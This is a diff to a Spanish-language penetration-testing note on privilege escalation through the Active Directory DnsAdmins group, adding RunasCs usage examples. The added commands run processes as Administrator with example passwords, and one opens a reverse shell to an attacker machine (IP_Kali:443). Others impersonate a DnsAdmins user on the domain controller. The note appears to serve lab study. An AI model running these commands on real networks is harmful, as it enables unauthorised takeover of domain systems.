@@ -50,11 +50,26 @@ El grupo `DnsAdmins` en Active Directory es un grupo especial que tiene privileg
 
 ## Cargando una dll maliciosa con dnscmd
 
+* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
+```powershell 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe"
+# Ejecutar una reverse shell a Kali 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
+
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
+	# -l 9 = Mismo comportamiento que '/netonly'
+
+# Ejecutar un comando 
+❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
+```
+
 ```powershell
 # Estos comandos se deben ejecutar en el DC
 
-# Impersonando al usuario dnsadmin.user
-❯ runas /netonly /user:spartancybersec.corp\dnsadmin.user "powershell.exe"   # Ejecutara una ventana de 'Powershell'
+# Impersonando al usuario dnsadmin.user y  ejecutara una ventana de 'Powershell'
+❯ runas /netonly /user:administrator.corp\dnsadmin.user "powershell.exe"  
 
 Nota: Aunque se ingrese la password mal se abrirá el 'Powershell' por lo que se debe tener cuidado al ingresarla para que funcione de manera correcta 
 
